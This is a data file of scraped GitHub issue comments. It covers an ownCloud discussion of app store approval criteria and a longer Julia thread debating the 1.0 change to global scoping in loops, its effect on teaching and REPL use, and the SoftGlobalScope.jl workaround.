store so that you know you're getting the real thing, but it's usually not implied that they're superior. This is certainly not true of quite a few official oC apps which don't meet the criteria on that publishing page. If you get the man power, you could create a special Black label for official and approved apps which are of excellent quality. That could help users pick the superior Calendar, Tasks or Mail app instead of blindly trusting unmaintained ""official"" apps. ",,False,False,17122
core/owncloud/17122/117312025,"Won't happen. If something is missing app developers has to add new APIs to core but we won't approve apps that use the private API. There may be cases where we do accept excuses but this is not going to be the default and a ""should"" implies otherwise. - We should stay with the ""can"" here from my PoV. Mobile apps run sandboxed. We can't do this. Installing an ownCloud app really means ""all your data is going to be eaten"". There is a reason why we add a huge scary text. I mean we have no problem with giving 100 apps an approved rating as long as know that the developer is a somewhat trustworthy person and the app looks somewhat sane. But we should be scary. I'd go with something like ""should follow best practises, i.e. using the AppFramework and not deprecated APIs where possible"", but we should not make this an hard requirement. I mean if code works Fine. We can make it clear that using the AppFramework makes reviewing easier and thus makes us approve the app faster but we should not enforce the full technology stack. The latter part will be fixed with an upcoming AppStore update that @friend is working on. The same app in the appstore can then serve multiple versions. ",,False,False,17122
core/owncloud/17122/117312072,upcoming AppStore update === will very likely be in 8.1 ,,False,False,17122
core/owncloud/17122/117316172,"Everything which relates to public sharing is not in the public space and it's not something that an app dev can fix on its own. On top of that it would probably take 6-12 months to fix issues in core before being able to start working on the app. You have to be realistic about your expectations. Very few, if any, core apps pass the code_checker test. The ""do as I say, not as I do"" attitude is not the best way to get developers to work on expanding the ecosystem. A lot of apps come from the need to improve what's available in core, but devs might get discouraged because their app would be stuck in the experimental bin or frustrate users because of missing key functionalities. Good point, but they can still wipe your internal or external storage, wreck your contacts list, corrupt your calendar, etc. The user chooses to trust the app with his data. Works for me. Good news ) ",,False,False,17122
core/owncloud/17122/117318046,Which probably really means that the current public sharing API is not to be really expected to be widely used by third-party developers speak_no_evil Only with granting explicit permission. ,,False,False,17122
core/owncloud/17122/117326430,"Indeed, which means that 3rd party apps can't compete. Devs have to choose between getting their apps approved or give users what they want, leading to an unappealing app store littered with constrained and experimental apps dr_doom And that's a model you could follow, sort of. Get rid of the warning in the app store and add a warning which pops up when someone tries to enable an approved app. Would work with occ as well. ",,False,False,17122
core/owncloud/17122/118036351,"How about we get together and discuss this at the conf, see what we can improve. By that time we have had about 6-7 weeks of experience with it... I don't think this is, like, totally burning down, is it? ",,False,False,17122
core/owncloud/17122/118069487,"I think you should hold an open forum on these sort of issues, to try and get some feedback. You could also ask everyone to fill in a questionnaire since some people might not feel comfortable coming forward publicly. ",,False,False,17122
core/owncloud/17122/118386752,"well, we do mail to the ML and discuss it here ;-) That's about as much open forum as you can have here, I suppose. I'll also blog about this at some point soon. And there is the conference.... ",,False,False,17122
core/owncloud/17122/118387822,"Let's see how the change is received by the community at large. If people are unhappy, you'll know -&gt; No growth/defection, Twitter rants, blog posts, etc. I think the first reaction is going to be devs trying to get approved in order to avoid the experimental label and that's a good thing if approval or rejection happens within a week. I still think a form is a good idea because you can link to the terms and people won't be able to ignore your criteria. ",,False,False,17122
core/owncloud/17122/118605282,"yes, a form might be a good idea. But I don't see much effort put in until the release, at least not by me - I've been crazy busy with promotion/marketing preparations for the release, writing my fingers blue, editing videos etc. And everybody else is busy fixing bugs. So, for now - and maybe that is a mistake, but it is what it is - this is where we stand. Also note that apps, right now, would simply not show up AT ALL if they weren't added to the app store. Users had to install them manually. So in that regard, this is a step forward for most apps. And yes, the idea is of course to motivate app developers to try and get their app from 'experimental' to 'approved' ;-) ",,False,False,17122
core/owncloud/17122/121226706,"No problem about the form, just an idea. Maybe do an annual survey with some prices when there is not a release or a conference to organise? ;) In my experience, surveys have to be short or the incentive large (a copy of the $2000 report, etc.) ",,False,False,17122
core/owncloud/17122/122257895,"This is fixed, eh? @friend ",,False,False,17122
julia/JuliaLang/28789/352373552,"Example 1 This came up with a student who upgraded from 0.6 to 1.0 directly, so never even got a chance to see a deprecation warning, let alone find an explanation for new behavior Example 2 I ""get"" why this happens in the sense that I think I can explain, with sufficient reference to the arcana in the manual about what introduces scopes and what doesn't, but I think that this is problematic for interactive use. In example one, you get a silent failure. In example two, you get an error message that is very there-is-no-spoon. Thats roughly comparable to some Python code I wrote in a notebook at work today. I'm not sure what the rules are in Python, but I do know that generally you can't assign to things at the global scope without invoking global. But at the REPL it does work, presumably because at the REPL the rules are different or the same logic as if they were all are in the scope of function is applied. I can't language-lawyer the rules enough to propose the concrete change I would like, and based on Slack this isn't even necessarily perceived as an issue by some people, so I don't know where to go with this except to flag it. ",,False,False,28789
julia/JuliaLang/28789/414539675,"(Per @friend, this is the relevant change ",,False,False,28789
julia/JuliaLang/28789/414544920,I vaguely remember some discussion of one possibility to solve this issue being automatic wrapping of REPL entries in  blocks? ,,False,False,28789
julia/JuliaLang/28789/414614359,"But wouldn't that be confusing in that you couldn't do and use  after that? Unless  is inserted for all the toplevel assignments, I guess? ",,False,False,28789
julia/JuliaLang/28789/414664339,The behavior wouldn't be just to wrap everything in a  block—it's more complicated than that. You need to let-bind any global that's assigned inside the expression and then extract the let-bound value to a global at the end of the expression. ,,False,False,28789
julia/JuliaLang/28789/414666648,"So you would turn  into something like . And something like would be turned into this Frankly, I'm pretty annoyed that people are only giving this feedback now. This has change has been on master for ten months. ",,False,False,28789
julia/JuliaLang/28789/414676770,"I'm guilty of not having followed master very closed until recently, so this feedback is indeed a bit late. More than a concern for programmers (most  loops will be inside a function in library code) I'm afraid this is a concern for teaching. Often  loops are taught before functions or scopes (of course you need to understand scopes to really understand what's going on but in teaching things are often simplified). Here it becomes a bit difficult to teach a beginner how to sum numbers from 1 to 10 without explaining functions or global variables. ",,False,False,28789
julia/JuliaLang/28789/414679559,"To be fair, Julia 0.7 was released 13 days ago. This is a new change for most Julia users. ",,False,False,28789
julia/JuliaLang/28789/414683856,"Unfortunately for those of us who can not handle living on the edge, its brand-new from our perspective. ",,False,False,28789
julia/JuliaLang/28789/414685810,"And for those of us who have been encouraged to stay off the development branches, ""it's brand-new from our perspective."" ",,False,False,28789
julia/JuliaLang/28789/414691501,"Can we please go back to focus on the issue at hand now, instead of having a meta issue discussion about how long people have had to test this. It is what it is right now, so let's look forward. ",,False,False,28789
julia/JuliaLang/28789/414693113,"This is a big point. After finding out what the issue really is, it's surprising how little it actually shows up. It is less of an issue with a lot of Julia code in the wild and in tests, and it did reveal a lot of variables which were accidentally global (in both Julia Base's tests according to the original PR, and I noticed this on most of DiffEq's tests). In most cases it seems that the subtly wrong behavior isn't what you get (expecting a change in a loop), but rather expecting to be able to use a variable in a loop is what I've found to be the vast majority of where this shows up in updating test scripts to v1.0. So the good thing is that in most cases the user is presented with an error, and it's not difficult to fix. The bad thing is that it's a little verbose to have to put  inside of the loops, and now your REPL code is also different from the function code. Whether or not it's more intuitive behavior than before is a tough opinion because there were definitely some edge cases in hard/soft local scoping and so this is clearly easier to explain. But at the same time, while having a much more succinct explanation than the behavior of before, it's now easier to hit the edge cases where understanding scoping rules matters. 🤷‍♂️. I for one would like to see the experiments with  blocking. This would keep the ""you didn't really want so many globals"" aspect of it, along with the simplified scoping explanation, while at the same time make REPL code behave like function interiors (which is seemingly what we've always wanted). Or inversely, making people specify variables they want to act as globals could be a nice way to keep the explicitness, and would make the ""REPL code is slow because of globals"" be much more obvious. The downside is that once again throwing things into a function would not require the  markers. But given how this tends to show up, it's not really gamebreaking or a showstopper. I'd classify it as a wart  that should get a mention in any workshop but it's not like v1.0 is unusable because of it. I hope that changing this behavior isn't classified as breaking and require v2.0 though. ",,False,False,28789
julia/JuliaLang/28789/414705246,"I'm not so sure I like the idea that the REPL should behave like a function interior.  It clearly isn't, so I expect it to behave like global scope.  To me the REPL not behaving like global scope would be potentially even more confusing than the discrepency that causes this issue. Regardless, at the very least I think that the documentation should be somewhat more explicit about this issue.  Casually reading the docs I would have assumed that you would need to use the  keyword to get the behavior occurs in global scope by default. ",,False,False,28789
julia/JuliaLang/28789/414708059,"If we're going for ""REPL is the same as the inside of a function"" we should also think about  versus ",,False,False,28789
julia/JuliaLang/28789/414736816,"People haven't been using master for interactive use or for teaching, they've been using it to upgrade packages, which are only minimally affected by this and are mostly written by experienced programmers. (I was one of the few people who did give feedback in #19324, though, where I argued for the old behavior.) A non-breaking way out of this would be to change back to the old behavior (ideally not by inserting implicit  blocks or anything — just restore the old code in  as an option) in the REPL.  Or rather, to make it available in environments like IJulia that might want it, add a  flag to , , and  to restore the old behavior. ",,False,False,28789
julia/JuliaLang/28789/414744522,"Yes, and I greatly appreciate it. It doesn't much matter now since we made the choice, let it bake for ten months and have now released it with a long-term commitment to stability. So the only thing to do now is to focus on what to do going forward. Having an option to choose between the old behavior and the new one is interesting but it feels very hacky. That means we not only sometimes have a scoping behavior that everyone apparently found incredibly confusing, but we don't always have it and whether we have it or not depends on a global flag. That feels pretty unsatisfactory, I'm afraid. ",,False,False,28789
julia/JuliaLang/28789/414745619,"If someone implements an ""unbreak me"" soft-scope AST transformation, it will be very tempting to use it in IJulia, OhMyREPL, etcetera, at which point you get the even more problematic situation in which the default REPL is seen as broken. ",,False,False,28789
julia/JuliaLang/28789/414747822,"That's not what I'm saying. Clearly we should use the same solution in all those contexts. But implementing it as two different variations on scoping rules seems less clean than implementing it as a code transformation with one set of scoping rules. But perhaps those are functionally equivalent. However, it seems easier to explain in terms of the new simpler scoping rules + a transformation that takes REPL-style input and transforms it before evaluating it. ",,False,False,28789
julia/JuliaLang/28789/414749202,"That could be done as  that transforms an expression by automatically annotating any globals which exist in the module as global if they are assigned inside of any top-level non-function scope. Of course, I think that's equivalent to what the old parser did, but a bit more transparent since you can call  yourself and see what the REPL will evaluate. ",,False,False,28789
julia/JuliaLang/28789/414749541,"I actually started looking into implementing this a few minutes ago.  However, it looks like it would be much easier to implement as an option in   Writing an external AST transformation is possible, but it seems like there are lots of tricky corner cases … whereas we already had the code to get it right in . It's even more tricky for something like IJulia that currently uses  to evaluate a whole block of code and get the value of the last expression.  Not only would we have to switch to parsing expression by expression, but some hackery may be needed in order to preserve the original line numbers (for error messages etcetera). Not to mention of the case of people that  external files, which would not be caught by your AST transformation.  I seriously doubt this would be easier to explain to new users than just saying that the rules are less picky for interactive use. ",,False,False,28789
julia/JuliaLang/28789/414764508,Here is a rough draft of a  implementation ,,False,False,28789
julia/JuliaLang/28789/414799023,"Okay, I've figured out how to implement a  function that preserves line-number information, and have added it to my gist. A possible (non-breaking) way forward, if people like this approach  Release a SoftGlobalScope.jl package with the  etc. functions. Use SoftGlobalScope in IJulia (and possibly Juno, vscode, and OhMyREPL). Fold the SoftGlobalScope functions into a future release of the REPL stdlib package and use it in the REPL.  Or is it practical to roll it into REPL.jl immediately?  I'm not completely clear on how stdlib updates work in 1.0. Please take a look at my implementation, in case I'm missing something that will cause it to be fragile. ",,False,False,28789
julia/JuliaLang/28789/414827097,Can't we have it as a non-default feature of the REPL in 1.1? ,,False,False,28789
julia/JuliaLang/28789/414833357,"Duplicate of #28523 and #28750. To those saying they don't want to teach people about global variables, I suggest teaching functions first, before  loops. Functions are more fundamental anyway, and this will help set the expectation that code should be written in functions. While I understand the inconvenience, this scoping behavior can be turned into a pedagogical advantage ""In fact, global variables are such a bad idea, particularly using them in loops, that the language makes you bend over backwards to use them."" Adding a non-default feature to the REPL for this seems ok to me though. ",,False,False,28789
julia/JuliaLang/28789/414851094,"@friend, remember that many of us would like to use Julia as a substitute for Matlab etcetera in technical courses like linear algebra and statistics.  These are not programming courses and the students often have no programming background.   We never do structured programming — it's almost all interactive with short snippets and global variables. Furthermore, the reason I'm using a dynamic language in the first place is to switch fluidly between interactive exploration and more disciplined programming.   The inability to use the same code in a global and a function context is a hindrance to that end, even for someone who is used to scoping concepts, and it is much worse for students from non-CS backgrounds. ",,False,False,28789
julia/JuliaLang/28789/414855621,"Many of us Julia users have absolutely 0 CS background (including myself), but it seems to me that the proper attitude (especially for students) is a willingness to learn rather than demanding things be changed for the worse to accommodate our naivete. Now, I'm not necessarily implying that this particular change would be for the worse as I only have a limited understanding of what's going on here, but if it is the case that this is a significant complication or makes it excessively easy to write needlessly badly performing code it does not seem worth it to make a change in order to have a better lecture example.  You can't change the laws of physics so that the electrostatics examples you show to freshman are more applicable to real life. So my question as a non-CS user who also cares about performance is how would I be likely to screw up if this were made the default behavior.  Is it literally just the sorts of examples we are seeing here that are a problem (which I was already aware of), or are we likely to often screw this up badly in more subtle ways? For what it's worth, I do agree that having code behave differently depending on its enclosing scope is a generally undesirable feature. ",,False,False,28789
julia/JuliaLang/28789/414870502,"Making code harder to write interactively, forcing beginners writing their first loops to understand obscure scoping rules, and making code pasted from functions not work in global scopes does not help programmers write fast code in functions. It just makes it harder to use Julia interactively and harder for beginners. ",,False,False,28789
julia/JuliaLang/28789/414872850,"Making an ""unbreak me"" option the default seems wiser, especially an option that is aimed squarely at beginning users.   If it is a non-default option, then precisely those people who need it most will be those who don't have it enabled (and don't know it exists). ",,False,False,28789
julia/JuliaLang/28789/414930024,"What would the proposed REPL-mode do to ed scripts?  Would the evaluation of global statements depend on whether the REPL mode is activated?  If so, IMO this would be at odds with the 1.0 stability promise. ",,False,False,28789
julia/JuliaLang/28789/414937052,"If we did something like this it seems like it might make sense for the module to determine how it works. So  would be a ""soft scope"" module while by default other modules would be ""hard scope"" modules. ",,False,False,28789
julia/JuliaLang/28789/415063358,"I was interested to see if it was possible to monkey patch the REPL to use @friend's  function and it appears it is without too much effort (though quite hacky). See the gist. This doesn't work with Juno (or anything else that calls  directly). I'm not going to be recommending this to people, but it's quite useful to me when doing quick-and-dirty data analysis. I would very much like to see a (better thought out) solution since it really is quite confusing for inexperienced and often reluctant coders (i.e., my students) when you can't copy and paste in code from a function into the REPL to see what it does and vice-versa. (BTW the above is about as much testing as it has had!) ",,False,False,28789
julia/JuliaLang/28789/415065926,"Nothing.   Basically, the proposal is that this would only be for code entered at an interactive prompt.   As soon as you start putting things in files, you need to learn the ""hard scope"" rules.   Hopefully, when you start putting code into files you should start using functions. It's not ideal for there to be pickier scoping rules for global code in files than at the prompt.   But I think that #19324 combined with the Julia 1.0 stability promise leaves us with no ideal options. ",,False,False,28789
julia/JuliaLang/28789/415069914,"@friend Having taught courses using Julia to students with prior exposure to Matlab/R/..., I sympathize with this concern. But at the same time, I don't think that using Julia just as a Matlab etc substitute is a viable approach as demonstrated countless times by questions on Discourse and StackOverflow, this can lead to performance pitfalls that are difficult to fix and understand, possibly entailing an even larger cost than investing in understanding how Julia is different from these other languages (cf posts with topics ""I translated this code from Matlab and it is 10x slower""). I think that the key issue is the silent failure; the issue per se is easy to understand and fix. I would suggest keeping the new behavior, but giving a warning in  (by default; it should be possible to disable it). ",,False,False,28789
julia/JuliaLang/28789/415080902,"Sorry, but this argument is ridiculous to me.   I'm not talking about classes where I'm teaching programming.  There's a place for simple interactive computations, and in non-CS classes it's common to be introduced to programming languages as a ""glorified calculator"" to start with.  Teaching performance computing in Julia is an entirely different process — but it doesn't hurt if they've already been using Julia as their ""calculator."" If you start by introducing students to Matlab as their ""calculator,"" it's much harder to make the transition to ""real"" programming, because their first instinct is to do as much as possible with Matlab before jumping ship, at which point their bad habits are ingrained and they are reluctant to learn a new language.  In contrast, if you start with Julia as your glorified calculator, when it comes time to do more serious programming you have a much wider array of options available.  You don't have to train them to cram everything into ""vector"" operations or force them to do things badly before they do it right. Are you saying I shouldn't use Julia in my linear-algebra course?   Or that I should only use it if I'm prepared to teach computer science as well as linear algebra? ",,False,False,28789
julia/JuliaLang/28789/415086587,"I agree with @friend both on the problem (teaching to non programmers becomes much harder) and on the solution (make things work in the REPL and the various IDEs). Including a script would still have the Julia 1.0 scoping rules but that's less of a concern, one just has to be careful to have the ""we can put our for loop in a function and then call the function"" class before the ""we can put our for loop in a file and include the file"" class. This sounds like a good compromise as interactive debugging at the REPL doesn't become more painful than it needs to be (or more confusing to new users), while normal code in scripts has to follow strict scoping rules and is safe from bugs overwriting some variables accidentally. ",,False,False,28789
julia/JuliaLang/28789/415087488,"You may have misunderstood what I was saying (or I did not express it clearly). I was talking about courses that use Julia to teach something domain-specific (eg I taught numerical methods to econ grad students), not CS courses (which I have no experience with). The point that I was trying to make is that it is reasonable to expect a certain level of difference between Julia and language X (which may be Matlab); conversely, ignoring this can (and does) lead to problems. Personally, when learning a new language, I prefer to face these issues early on; also, I think simplicity and consistency of the language semantics is more important than similarity to other languages in the long run. But I recognize these preferences as subjective, and reasonable people can have different ones. ",,False,False,28789
julia/JuliaLang/28789/415101455,"I've created the (unregistered) package  this seems reasonable, I can go ahead and register the package and then use it by default in IJulia (and perhaps submit PRs to Juno etcetera). ",,False,False,28789
julia/JuliaLang/28789/415102619,"Obviously.  When I say ""use Julia instead of Matlab"", I don't mean I'm trying to teach them Matlab syntax in Julia. It's not about differences from Matlab per se.  I would really rather not talk about global vs local scope and the utility of a  keyword for static analysis the first time I write a loop in front of non-CS students, or the first time they paste code from a function into the REPL to try it interactively.   I would rather focus on the math I'm trying to use the loop to express. No one here is arguing for soft interactive scope just because that's what Matlab users expect.  We are arguing for it because that is what all first-time users will expect.   (And because even for experienced users, it's rather inconvenient to be forced to add  keywords when we are working interactively.) ",,False,False,28789
julia/JuliaLang/28789/415104827,One other fix not mentioned here is to simply stop making ‘for’ define a scope-block (just function and let would create new scope) ,,False,False,28789
julia/JuliaLang/28789/415105087,"@friend, I'd rather focus this discussion on things that we can do before Julia 2.0.   I agree that having interactive mode behave differently is only a stopgap, though, and we should seriously contemplate changing the scoping rules in a few years. ",,False,False,28789
julia/JuliaLang/28789/415107802,"Good point, this also needs  😀 (I think this module/namespace/behavioral effect already is reserved/exists) As a reminder here, the change was to ensure that code behaves the same in all global scope environments, regardless of what else had previously been evaluated in that module. Before this change, you could get completely different answers (resulting from different scope assignment) simply by running the same code twice or by moving it around in a file. ",,False,False,28789
julia/JuliaLang/28789/415108211,The number of complaints I saw about that in practice (zero) are certain to be dwarfed by the number of complaints and confusion you will see (and are already seeing) about the current behavior. ,,False,False,28789
julia/JuliaLang/28789/415109136,"Do you mean that in the below code,  changes between the first and second  loops? In my mind, that's expected behavior, not a bug. ",,False,False,28789
julia/JuliaLang/28789/415218559,"@friend @friend I suppose adding a function (say, ) can be done with just a minor version bump?  We can also warn 'ing another file from 'ed script and then put some pedagogical messages there to nudge them to use . ",,False,False,28789
julia/JuliaLang/28789/415280847,"Some thoughts I wrote down last night while trying to wrap my head around this issue (yet again) to try to figure out what the best course of action might be. No conclusion, but I think this lays out the problem quite clearly. After having thought about this issue for some years, I don't think there is any ""ideal solution""—this may be one of those problems where there are only suboptimal choices.  People naively view global scope as a funny kind enclosing local scope. This is why global scopes worked the way they did in Julia 0.6 and prior  If an outer local scope creates a local variable and an inner local scope assigns to it, then that assignment updates the outer local variable. If an outer global scope creates a global variable and an inner local scope assigns to it, then that assignment previously updated the outer global variable.  The main difference, however, is  Whether an outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope. Whether a global variable exists, however, cannot be independent of order, since one evaluates expressions in global scope, one at a time.  Moreover, since global scopes are often quite lengthy—not infrequently spread across multiple files—having the meaning of an expression depend upon other expressions an arbitrary distance from it, is a “spooky action at a distance” effect, and as such, quite undesirable.  This last observation shows why having the two different versions of a for loop at global scope behave differently is problematic Also note that the contents of  and  are identical and we could simplify the example by including the same file twice with a different meaning and behavior each time. ",,False,False,28789
julia/JuliaLang/28789/415282794,Another problematic case is a long-running REPL session. Try an example from somewhere online? It fails because you happened to have a global variable by the same name that the example uses for a local variable in a for loop or similar construct. So the notion that the behavior is the only one that can cause confusion and problems is definitely not accurate. I agree that the new behavior is a usability issue in the REPL but I just want to temper the conversation and present the other side clearly here. ,,False,False,28789
julia/JuliaLang/28789/415496822,"My small suggestion, that does not deal with the repl problem, but would be useful for didactic purposes when teaching the language not-interactively, at least define a main block named ""program"", like can be done in fortran (it is the same as the ""let...end"" above, just with a more natural notation) program test ... end one could teach the language without going into the scope details and only eventually discuss that point. ",,False,False,28789
julia/JuliaLang/28789/415500327,"How many mailing-list complaints and github issues have been filed about this?  Zero, by my count.   Why?  Probably because this behavior is fundamentally unsurprising to people — if you work in global scope, you depend on global state. I think this is a false equivalence — there is a vast disparity in the level of potential confusion here.  In Julia 0.6, I could explain your example to a student in seconds ""Oh, see this loop depends on , which you changed here.""   In Julia 1.0, I'm honestly worried about what I will do if I'm in the middle of a linear-algebra lecture and have to mysteriously type a  keyword in front of students who have never heard the word ""scope"" in the CS sense. ",,False,False,28789
julia/JuliaLang/28789/415531290,"Absolutely not. Do you seriously want to go back to the pre-v0.2 world (see #1571 and #330) of loop scope? We have actually never fully supported copying and pasting code from a function line-by-line into the REPL. So we can view this as an opportunity to make that work. Specifically, while it ""worked"" for  loops, it did not work for inner functions Inside a function,  will mutate the  from the first line. In the REPL it won't. But with a transformation like that in SoftGlobalScope.jl it could work. Of course, we probably wouldn't want that on by default since then pasting stand-alone function definitions wouldn't work. The first thing that comes to mind is a REPL mode for line-by-line function debugging. ",,False,False,28789
julia/JuliaLang/28789/415541690,"No, I want to go back to the 0.6 world. 😉 ",,False,False,28789
julia/JuliaLang/28789/415552955,I guess I was responding more to ,,False,False,28789
julia/JuliaLang/28789/415606620,"I very much appreciate this sentiment and for my use cases it would really help. From my perspective it is really about making the REPL as useful as possible rather than changing the scoping rules of the language directly. That said, the more I think about this problem the more I see the conflicting views I (personally) hold as to what the REPL should do. To be concrete, I'd very much like it if the REPL matched the scoping rules of a function body; i.e., variables are local rather than global and you can just copy-and-paste code directly from a function and know that it will work. I imagine a naive implementation would be something like let-block wrapping (as has been mention previously) of the form being transformed into Done properly (i.e., by someone who knows what they are doing), I imagine that this would have a number of benefits over the existing REPL. 1. previous workflows with interactive data analysis/computation just work. 2. far fewer posts on Discourse where the basic response is ""stop benchmarking with global variables"" - everything would be local and so hopefully fast! ) 3. copy-and-paste to/from a function body works as expected. 4. a  like function is trivial if the backing store is some sort of Dict; just clear it out. 5. globals become explicit - things are local unless you specifically ask for them to be global; this is a big advantage from my perspective, I don't like implicitly creating globals. A very minor final point (and I hestiate to add this!), this would match the behaviour of Matlab making it easier for people transitioning - at the Matlab REPL all variables seem to be local unless explicitly annotated as global. Until a few hours ago this story sounded great to me. But after Jeff's comment about functions I thought about pasting in stand-alone function definitions and how this approach would basically prevent that since function definitions should go in the global scope (at least, that is probably what is intended); but then what if they were intended to go into the local scope (an inner function)? There is no information to disambiguate the two possibilities. It would seem that two REPL modes are needed, one with local scope and one global scope. On one hand that could be very confusing (imagine the Discourse posts...) but on the other it could be extremely useful. (Having both REPL modes would also be non-breaking since you are just introducing new functionality ) ) Going for the halfway house of  might end up being the least confusing compromise but my worry is that it's just another set of rules to remember (which things work in the REPL but not in my function body/global scope and vice-versa). Apologies for the long post but I think this is important for usability (and it helped me think it through!). ",,False,False,28789
julia/JuliaLang/28789/415657705,"Hmm, did you really make a systematic study of this? I must have missed that. Nevertheless, this does not mean that this behavior is not a source of bugs or unexpected results; just that after the user has figured it out, it was recognized as correct behavior and thus did not prompt an issue/complaint. I sympathize with this problem. When I taught into some simple programming to econ students necessary for a course, I usually suggested that they go back and forth between wrapping code in functions, and simply commenting out  and  and running things in the global scope, so they could inspect what is happening. This pretty much made up for the lack of debugging infrastructure at that time in Julia. It appears this approach is no longer feasible. But I wonder if it was really the right way to do it anyway, and in the meantime various things have improved a lot (#265 was fixed, Revise.jl and recently Rebugger.j have improved workflow/debugging considerably). It seems that this issue does not bother experienced users very much, the main concern is confusion in a pedagogical setting. I have not experimented with this myself yet, but I wonder if we could adapt our approaches to teaching instead, eg introduce functions before loops, avoid loops in global scope. These are elements of good style anyway and would benefit students. ",,False,False,28789
julia/JuliaLang/28789/415672805,"Just a wee note whilst special casing the global scope of the REPL, will allow copy-pasting code into and from functions, it will not allow copy-pasting into/from the global scope of another module. ",,False,False,28789
julia/JuliaLang/28789/415806279,This is totally impractical in a class that is not focused on teaching programming.   I might as well not use Julia in my classes if I can't use it interactively and/or have to write functions for everything first. (And it's not just pedagogical.  Loops in global scope are useful for interactive work.  And one of the main reasons people like dynamic languages for technical computing is the facility for interactive exploration.) ,,False,False,28789
julia/JuliaLang/28789/416000347,"There have been dozens of threads and issues over the years in which people are confused or complaining about the old ""soft/hard scope"" distinction, so claiming that no one has ever been confused by or complained about the old behavior is just... not true. I could dig some of them up, but you were around, @friend, so you can dig them up just as easily and I have a hard time believing that you didn't notice or don't remember these complaints and conversations. ",,False,False,28789
julia/JuliaLang/28789/416031817,"@friend, I'm specifically referring to people complaining that a global loop depends on global state.  I don't recall anyone complaining that this was bad behavior. I agree that people have been confused about when and where assignment defines new variables, but it has usually been in the other direction — they wanted local scopes to act more global (rather than vice versa), or to not have a distinction between  and .   IIRC, the complaint was never that assigning to a global variable in a global loop had the surprising side effect of modifying a global. I agree that the whole issue of scoping is confusing to new users, and it will continue to be so.  But the confusing part was not cases where assigning to a global variable name affected the global state. ",,False,False,28789
julia/JuliaLang/28789/416163963,"@friend I have the feeling that previously, the confusion with soft/hard scope was more of a theoretical nature (of people reading the manual) rather than of a practical on (of people getting unexpected results).  That was definitely how it was for me and what, e.g., the search results here support this; I found one counter-example here. On the other hand, this new behavior will not confuse people when reading the manual, but when using the REPL.  Arguably the latter is worse. ",,False,False,28789
julia/JuliaLang/28789/416217595,"SoftGlobalScope.jl is now a registered package.  My intention is to enable it by default (opt-out) for IJulia, at least this semester. ",,False,False,28789
julia/JuliaLang/28789/416218130,"@friend, even your ""counter-example"" is about someone confused by hard scope, not by soft scope.  Making more scopes ""hard"" in 0.7 is certain to create more of this sort of confusion. ",,False,False,28789
julia/JuliaLang/28789/416306838,"I would point out that IJulia has the interesting possibility of making variables local do blocks by default. I.e. if you do this in a single block then it works ... and  is only visible within this evaluation block. If you wanted it to be visible outside, you would have to do this I have also considered a similar approach for Julia where the blocks are files rather than module. In other words just doing  at top scope creates a variable that is file-local rather than global. To declare a truly global variable, you'd need to write  which would then be visible throughout the module. Perhaps too weird, but it has occurred to me many times over the years. ",,False,False,28789
julia/JuliaLang/28789/416324660,"@friend, I think this would be even more confusing, and would run counter to how notebooks are normally used.  It is common for the same variable to be used/modified in multiple cells, so requiring a  keyword for all inter-cell variables is a nonstarter to me — it would require even more discussion of scope concepts than the issue with  loops we've been discussing here. ",,False,False,28789
julia/JuliaLang/28789/416339290,"I think as long as we all agree --- as we seem to --- that this is mostly or entirely an issue for interaction, then we have a way forward. If we special-case this in the REPL (as is being done for IJulia), the only bad case is developing something in the REPL and then moving it to top-level script code. Arguably that's the point where you should introduce functions, so I don't think it's so bad. Copy-pasting code between the REPL and function bodies will work (mostly), which is probably good enough. Then we also have the option of further justifying/clarifying the distinction by making REPL variables somehow local to the REPL --- i.e. not normal global variables, not available as . This is very similar to what @friend just proposed above, but shared among all input blocks/cells. ",,False,False,28789
julia/JuliaLang/28789/416579834,"From a practical point of view, getting this ""fixed"" in the REPL is not only important for teaching/non-programmer users. This behaviour also makes interactive debugging via the REPL (by copy-pasting parts) very unpractical. This mode of debugging can sometimes be preferable (even to a good debugger and) even for experienced programmers (and is often one of the reasons to prefer a dynamic language). Of course for the experienced programmers, being optional shouldn't be a problem; For novice users it would be preferably the default. @friend  As a naive programmer, I don't really see what is so wrong in viewing the global scope as a funny kind enclosing local scope, especially in dynamic languages. I do understand that from a compiler point of view it is not necessarily correct (in Julia), but it is a nice, easy and useful model for a (naive) programmer. (I also suspect it might be actually implemented that way in some languages). Julia also seems to presents it that way to the programmer The following function function will give the error ""a not defined"", which it will not do if a=1 is put before the for loop. function test()     for i = 110         a=a+i     end     a=1     @friend a end which, unless I complete misunderstood, seems at odds with ""Whether an outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope"". I very much agree with avoiding ""spooky action at a distance"", and much prefer explicit definition for using globals at the function/call stack level and would personally also like having something like loading from a file in its own scope, and requiring explicit definition for using global variables. At the level of loops is going a bit to far for me though, as the definitions/context is usually quite near. The 3 files example is a bit contrived (and fails with the expected ""a not defined"" error) You would normally put the initial definition in the same file.  There is actual spooky danger in this (and I have been bitten by it in other languages) in that includes are run in the global scope, so you are inadvertently defining a global variable that may interfere with other code. However, having to use global in the loop is not a solution to this problem. wrt to the long-running REPL session The current behaviour replaces a very rare and easy to spot failure mode for running an online example in the REPL (you miss copy/pasting the initial definition of the variable before the loop, and already have the same variable defined globally from something previous) with not being able to run an online example correctly if it is part of a function (without adding global everywhere), and not solving the problem if it is not (if global is already there in the online code, you will still use the wrong value in the already existing global variable) ",,False,False,28789
julia/JuliaLang/28789/416589794,"I should have tuned into this earlier, but after a brief moment of concern all seems to be well. Indeed Rebugger (which is exactly that) works properly on 1.0 only because it lacks the scope deprecation of 0.7, and could never be made to work on 0.6. However, I'm pleased to be able to verify that SoftGlobalScope.jl seems not to break that. For example, if you step deeply enough into  you get here So it works fine on 1.0 (with or without ). On 0.7, evaluating this (with or without ) will yield So 0.7/1.0 are definitely a step forward, and if  makes certain things easier without breaking important functionality that's great. The biggest concern, therefore, is simply how to intercept this appropriately without tanking other packages (",,False,False,28789
julia/JuliaLang/28789/416597335,"@friend, SoftScope does not touch the arguments of macro calls (since there is no way to know how the macro would rewrite it), so  is protected. ",,False,False,28789
julia/JuliaLang/28789/417026433,"outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope"". The (outer) local variable  exists, but has not been assigned yet. If the loop tried to assign to  before reading it, the assignment would be visible outside as well. In general, creating a variable binding and assigning a value to it are separate steps. ",,False,False,28789
